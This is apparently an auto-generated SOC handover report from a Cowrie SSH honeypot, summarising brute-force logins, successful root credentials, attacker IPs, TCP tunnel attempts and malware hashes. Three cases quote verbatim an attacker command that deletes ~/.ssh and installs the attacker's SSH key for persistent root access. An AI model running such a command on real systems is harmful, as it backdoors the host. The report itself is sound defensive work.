# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-03-16 |
| **Generated At** | 2026-03-16T02:35:00Z |
| **Shift Time** | 02:35 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **97** |
| Confirmed Threats | **90** |
| False Positives Filtered | **7** (7.2%) |
| Unique Attacker IPs | **40** |
| Countries of Origin | **20** |
| High Severity Cases | **14** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **83** |
| Malware Samples Analyzed | **0** HIGH · **6** MED · 1 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **58** |
| Unique Credential Pairs | **41** |
| Unique Usernames | **31** |
| Unique Passwords | **35** |
| Successful Auth Pairs | **14** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 14 |
| `345gs5662d34` | 3 |
| `unity` | 2 |
| `music` | 2 |
| `coolify` | 2 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `1234` | 6 |
| `password` | 4 |
| `123` | 3 |
| `345gs5662d34` | 3 |
| `3245gs5662d34` | 3 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 3 |
| `root` | `3245gs5662d34` | 3 |
| `unity` | `1234` | 2 |
| `music` | `Music123` | 2 |
| `coolify` | `1234` | 2 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `Zz112233` | `80.71.227.151` | 2026-03-16T00:28:43 |
| `root` | `3245gs5662d34` | `80.71.227.151` | 2026-03-16T00:28:46 |
| `root` | `Server123!` | `102.88.137.213` | 2026-03-16T00:29:50 |
| `root` | `3245gs5662d34` | `102.88.137.213` | 2026-03-16T00:29:57 |
| `root` | ` ` | `47.237.163.130` | 2026-03-16T01:21:56 |
| `root` | `123P@ssw0rd` | `38.137.11.14` | 2026-03-16T01:34:31 |
| `root` | `3245gs5662d34` | `38.137.11.14` | 2026-03-16T01:34:32 |
| `root` | `159753` | `182.53.52.68` | 2026-03-16T02:31:04 |
| `root` | `root1234567890` | `119.200.229.33` | 2026-03-16T02:31:40 |
| `root` | `root1234567890` | `200.105.141.172` | 2026-03-16T02:31:49 |
| `root` | `qwerty123456` | `211.223.41.90` | 2026-03-16T02:33:56 |
| `root` | `qwerty123456` | `218.149.235.152` | 2026-03-16T02:34:05 |
| `root` | `toor` | `83.206.50.182` | 2026-03-16T02:34:05 |
| `root` | `toor` | `24.47.243.113` | 2026-03-16T02:34:12 |

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **40** |
| Unique ASNs | **27** |
| High-Risk ASNs | **21** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS8075` | Microsoft Corporation | 4 | HIGH |
| `AS135377` | UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED | 4 | HIGH |
| `AS4766` | Korea Telecom | 3 | HIGH |
| `AS4837` | CHINA UNICOM China169 Backbone | 2 | HIGH |
| `AS137718` | Beijing Volcano Engine Technology Co., Ltd. | 2 | HIGH |
| `AS4811` | China Telecom (Group) | 2 | HIGH |
| `AS45102` | Alibaba (US) Technology Co., Ltd. | 2 | HIGH |
| `AS38365` | Beijing Baidu Netcom Science and Technology Co., Ltd. | 2 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (14)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-4cd32cae953e

| Field | Detail |
|---|---|
| **Source IP** | `80.71.227[.]151` |
| **First Seen** | 2026-03-16 00:28 |
| **Last Seen** | 2026-03-16 00:28 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-16 00:28:42` | `cowrie.session.connect` |
| `2026-03-16 00:28:42` | `cowrie.client.version` |
| `2026-03-16 00:28:42` | `cowrie.client.kex` |
| `2026-03-16 00:28:43` | `cowrie.login.success` |
| `2026-03-16 00:28:43` | `cowrie.session.params` |
| `2026-03-16 00:28:43` | `cowrie.command.input` |
| `2026-03-16 00:28:43` | `cowrie.command.failed` |
| `2026-03-16 00:28:43` | `cowrie.log.closed` |
| `2026-03-16 00:28:43` | `cowrie.session.params` |
| `2026-03-16 00:28:43` | `cowrie.command.input` |
| `2026-03-16 00:28:44` | `cowrie.session.file_download` |
| `2026-03-16 00:28:44` | `cowrie.log.closed` |
| `2026-03-16 00:28:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.71.227[.]151` to AbuseIPDB if not already reported
- [ ] Block `80.71.227[.]151` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6fa1173a73dd

| Field | Detail |
|---|---|
| **Source IP** | `80.71.227[.]151` |
| **First Seen** | 2026-03-16 00:28 |
| **Last Seen** | 2026-03-16 00:28 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-16 00:28:46` | `cowrie.session.connect` |
| `2026-03-16 00:28:46` | `cowrie.client.version` |
| `2026-03-16 00:28:46` | `cowrie.client.kex` |
| `2026-03-16 00:28:46` | `cowrie.login.success` |
| `2026-03-16 00:28:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.71.227[.]151` to AbuseIPDB if not already reported
- [ ] Block `80.71.227[.]151` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-273b36007e59

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]213` |
| **First Seen** | 2026-03-16 00:29 |
| **Last Seen** | 2026-03-16 00:29 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-16 00:29:48` | `cowrie.session.connect` |
| `2026-03-16 00:29:48` | `cowrie.client.version` |
| `2026-03-16 00:29:49` | `cowrie.client.kex` |
| `2026-03-16 00:29:50` | `cowrie.login.success` |
| `2026-03-16 00:29:51` | `cowrie.session.params` |
| `2026-03-16 00:29:51` | `cowrie.command.input` |
| `2026-03-16 00:29:51` | `cowrie.command.failed` |
| `2026-03-16 00:29:51` | `cowrie.log.closed` |
| `2026-03-16 00:29:52` | `cowrie.session.params` |
| `2026-03-16 00:29:52` | `cowrie.command.input` |
| `2026-03-16 00:29:52` | `cowrie.session.file_download` |
| `2026-03-16 00:29:52` | `cowrie.log.closed` |
| `2026-03-16 00:29:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]213` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]213` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8301e1f921c5

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]213` |
| **First Seen** | 2026-03-16 00:29 |
| **Last Seen** | 2026-03-16 00:29 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-16 00:29:55` | `cowrie.session.connect` |
| `2026-03-16 00:29:55` | `cowrie.client.version` |
| `2026-03-16 00:29:56` | `cowrie.client.kex` |
| `2026-03-16 00:29:57` | `cowrie.login.success` |
| `2026-03-16 00:29:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]213` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]213` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3d5bf43e0035

| Field | Detail |
|---|---|
| **Source IP** | `47.237.163[.]130` |
| **First Seen** | 2026-03-16 01:21 |
| **Last Seen** | 2026-03-16 01:21 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-16 01:21:56` | `cowrie.session.connect` |
| `2026-03-16 01:21:56` | `cowrie.client.version` |
| `2026-03-16 01:21:56` | `cowrie.client.kex` |
| `2026-03-16 01:21:56` | `cowrie.login.success` |
| `2026-03-16 01:21:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `47.237.163[.]130` to AbuseIPDB if not already reported
- [ ] Block `47.237.163[.]130` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-be5a40765d13

| Field | Detail |
|---|---|
| **Source IP** | `38.137.11[.]14` |
| **First Seen** | 2026-03-16 01:34 |
| **Last Seen** | 2026-03-16 01:34 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-16 01:34:31` | `cowrie.session.connect` |
| `2026-03-16 01:34:31` | `cowrie.client.version` |
| `2026-03-16 01:34:31` | `cowrie.client.kex` |
| `2026-03-16 01:34:31` | `cowrie.login.success` |
| `2026-03-16 01:34:31` | `cowrie.session.params` |
| `2026-03-16 01:34:31` | `cowrie.command.input` |
| `2026-03-16 01:34:31` | `cowrie.command.failed` |
| `2026-03-16 01:34:31` | `cowrie.log.closed` |
| `2026-03-16 01:34:31` | `cowrie.session.params` |
| `2026-03-16 01:34:31` | `cowrie.command.input` |
| `2026-03-16 01:34:31` | `cowrie.session.file_download` |
| `2026-03-16 01:34:31` | `cowrie.log.closed` |
| `2026-03-16 01:34:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `38.137.11[.]14` to AbuseIPDB if not already reported
- [ ] Block `38.137.11[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c38b011612e4

| Field | Detail |
|---|---|
| **Source IP** | `38.137.11[.]14` |
| **First Seen** | 2026-03-16 01:34 |
| **Last Seen** | 2026-03-16 01:34 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-16 01:34:32` | `cowrie.session.connect` |
| `2026-03-16 01:34:32` | `cowrie.client.version` |
| `2026-03-16 01:34:32` | `cowrie.client.kex` |
| `2026-03-16 01:34:32` | `cowrie.login.success` |
| `2026-03-16 01:34:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `38.137.11[.]14` to AbuseIPDB if not already reported
- [ ] Block `38.137.11[.]14` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9b05ee3e5dfa

| Field | Detail |
|---|---|
| **Source IP** | `182.53.52[.]68` |
| **First Seen** | 2026-03-16 02:31 |
| **Last Seen** | 2026-03-16 02:31 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-16 02:31:02` | `cowrie.session.connect` |
| `2026-03-16 02:31:03` | `cowrie.client.version` |
| `2026-03-16 02:31:03` | `cowrie.client.kex` |
| `2026-03-16 02:31:04` | `cowrie.login.success` |
| `2026-03-16 02:31:04` | `cowrie.direct-tcpip.request` |
| `2026-03-16 02:31:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.53.52[.]68` to AbuseIPDB if not already reported
- [ ] Block `182.53.52[.]68` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fbf719d02936

| Field | Detail |
|---|---|
| **Source IP** | `119.200.229[.]33` |
| **First Seen** | 2026-03-16 02:31 |
| **Last Seen** | 2026-03-16 02:31 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-16 02:31:38` | `cowrie.session.connect` |
| `2026-03-16 02:31:39` | `cowrie.client.version` |
| `2026-03-16 02:31:39` | `cowrie.client.kex` |
| `2026-03-16 02:31:40` | `cowrie.login.success` |
| `2026-03-16 02:31:41` | `cowrie.direct-tcpip.request` |
| `2026-03-16 02:31:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `119.200.229[.]33` to AbuseIPDB if not already reported
- [ ] Block `119.200.229[.]33` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e7f9d0159da5

| Field | Detail |
|---|---|
| **Source IP** | `200.105.141[.]172` |
| **First Seen** | 2026-03-16 02:31 |
| **Last Seen** | 2026-03-16 02:31 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-16 02:31:46` | `cowrie.session.connect` |
| `2026-03-16 02:31:47` | `cowrie.client.version` |
| `2026-03-16 02:31:47` | `cowrie.client.kex` |
| `2026-03-16 02:31:49` | `cowrie.login.success` |
| `2026-03-16 02:31:50` | `cowrie.direct-tcpip.request` |
| `2026-03-16 02:31:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `200.105.141[.]172` to AbuseIPDB if not already reported
- [ ] Block `200.105.141[.]172` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-827f506b128c

| Field | Detail |
|---|---|
| **Source IP** | `211.223.41[.]90` |
| **First Seen** | 2026-03-16 02:33 |
| **Last Seen** | 2026-03-16 02:34 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-16 02:33:53` | `cowrie.session.connect` |
| `2026-03-16 02:33:54` | `cowrie.client.version` |
| `2026-03-16 02:33:54` | `cowrie.client.kex` |
| `2026-03-16 02:33:56` | `cowrie.login.success` |
| `2026-03-16 02:33:56` | `cowrie.direct-tcpip.request` |
| `2026-03-16 02:34:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `211.223.41[.]90` to AbuseIPDB if not already reported
- [ ] Block `211.223.41[.]90` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e6017993473e

| Field | Detail |
|---|---|
| **Source IP** | `218.149.235[.]152` |
| **First Seen** | 2026-03-16 02:34 |
| **Last Seen** | 2026-03-16 02:34 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-16 02:34:02` | `cowrie.session.connect` |
| `2026-03-16 02:34:03` | `cowrie.client.version` |
| `2026-03-16 02:34:03` | `cowrie.client.kex` |
| `2026-03-16 02:34:05` | `cowrie.login.success` |
| `2026-03-16 02:34:05` | `cowrie.direct-tcpip.request` |
| `2026-03-16 02:34:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `218.149.235[.]152` to AbuseIPDB if not already reported
- [ ] Block `218.149.235[.]152` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aefc867bafa2

| Field | Detail |
|---|---|
| **Source IP** | `83.206.50[.]182` |
| **First Seen** | 2026-03-16 02:34 |
| **Last Seen** | 2026-03-16 02:34 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-16 02:34:04` | `cowrie.session.connect` |
| `2026-03-16 02:34:04` | `cowrie.client.version` |
| `2026-03-16 02:34:04` | `cowrie.client.kex` |
| `2026-03-16 02:34:05` | `cowrie.login.success` |
| `2026-03-16 02:34:05` | `cowrie.direct-tcpip.request` |
| `2026-03-16 02:34:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `83.206.50[.]182` to AbuseIPDB if not already reported
- [ ] Block `83.206.50[.]182` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-85f64d056dcf

| Field | Detail |
|---|---|
| **Source IP** | `24.47.243[.]113` |
| **First Seen** | 2026-03-16 02:34 |
| **Last Seen** | 2026-03-16 02:34 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-16 02:34:10` | `cowrie.session.connect` |
| `2026-03-16 02:34:11` | `cowrie.client.version` |
| `2026-03-16 02:34:11` | `cowrie.client.kex` |
| `2026-03-16 02:34:12` | `cowrie.login.success` |
| `2026-03-16 02:34:13` | `cowrie.direct-tcpip.request` |
| `2026-03-16 02:34:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `24.47.243[.]113` to AbuseIPDB if not already reported
- [ ] Block `24.47.243[.]113` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `101.36.122[.]186` | **10** | 2026-03-16 00:10 | 2026-03-16 00:28 | 0m | 10 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `118.122.147[.]195` | **10** | 2026-03-16 00:31 | 2026-03-16 00:45 | 12m | 3 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `172.208.24[.]217` | **10** | 2026-03-16 00:08 | 2026-03-16 00:28 | 0m | 10 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `180.184.178[.]165` | **10** | 2026-03-16 00:29 | 2026-03-16 00:38 | 14m | 1 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `38.137.11[.]14` | **10** | 2026-03-16 01:29 | 2026-03-16 01:37 | 0m | 10 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `124.29.230[.]248` | **4** | 2026-03-16 00:00 | 2026-03-16 00:00 | 0m | 0 | `T1592` | 🟢 LOW |
| `101.36.122[.]139` | **3** | 2026-03-16 02:25 | 2026-03-16 02:33 | 0m | 3 | `T1110.001 · T1592` | 🟢 LOW |
| `20.168.122[.]81` | **2** | 2026-03-16 00:47 | 2026-03-16 00:48 | 0m | 0 | `T1592` | 🟢 LOW |
| `101.126.55[.]67` | 1 | 2026-03-16 02:29 | 2026-03-16 02:29 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `101.36.109[.]176` | 1 | 2026-03-16 02:29 | 2026-03-16 02:29 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `102.88.137[.]213` | 1 | 2026-03-16 00:29 | 2026-03-16 00:29 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `106.1.94[.]107` | 1 | 2026-03-16 01:10 | 2026-03-16 01:11 | 15s | 0 | `T1592` | 🟢 LOW |
| `118.145.74[.]48` | 1 | 2026-03-16 00:33 | 2026-03-16 00:35 | 120s | 0 | `T1592` | 🟢 LOW |
| `118.193.39[.]127` | 1 | 2026-03-16 02:30 | 2026-03-16 02:30 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `119.148.49[.]82` | 1 | 2026-03-16 01:07 | 2026-03-16 01:07 | 0s | 0 | `T1592` | 🟢 LOW |
| `120.48.29[.]51` | 1 | 2026-03-16 00:10 | 2026-03-16 00:12 | 120s | 0 | `T1592` | 🟢 LOW |
| `134.199.171[.]191` | 1 | 2026-03-16 01:11 | 2026-03-16 01:11 | 0s | 0 | `T1592` | 🟢 LOW |
| `138.97.64[.]146` | 1 | 2026-03-16 02:30 | 2026-03-16 02:31 | 14s | 0 | `T1592` | 🟢 LOW |
| `180.184.182[.]87` | 1 | 2026-03-16 00:32 | 2026-03-16 00:34 | 120s | 0 | `T1592` | 🟢 LOW |
| `180.76.105[.]165` | 1 | 2026-03-16 00:28 | 2026-03-16 00:30 | 120s | 0 | `T1592` | 🟢 LOW |
| `221.206.81[.]77` | 1 | 2026-03-16 01:51 | 2026-03-16 01:52 | 13s | 0 | `T1592` | 🟢 LOW |
| `42.113.255[.]234` | 1 | 2026-03-16 00:14 | 2026-03-16 00:14 | 0s | 0 | `T1592` | 🟢 LOW |
| `49.124.153[.]12` | 1 | 2026-03-16 02:22 | 2026-03-16 02:22 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `8.220.132[.]38` | 1 | 2026-03-16 02:25 | 2026-03-16 02:26 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `80.71.227[.]151` | 1 | 2026-03-16 00:28 | 2026-03-16 00:28 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (9 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/76 ✅ |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **46/76** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 11/100 | 🟢 LOW | **29/76** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 42/100 | 🟡 MEDIUM | **32/76** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **46/76** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `106.1.94[.]107` | TW | kbro CO. Ltd. | **100** ⚠️ | 12 |
| `8.220.132[.]38` | PH | Alibaba Cloud (Singapore) Private Limited | **100** ⚠️ | 2 |
| `221.206.81[.]77` | CN | China Unicom Heilongjiang Province Network | **100** ⚠️ | 2 |
| `42.113.255[.]234` | VN | FPT Telecom Company | **100** ⚠️ | 3 |
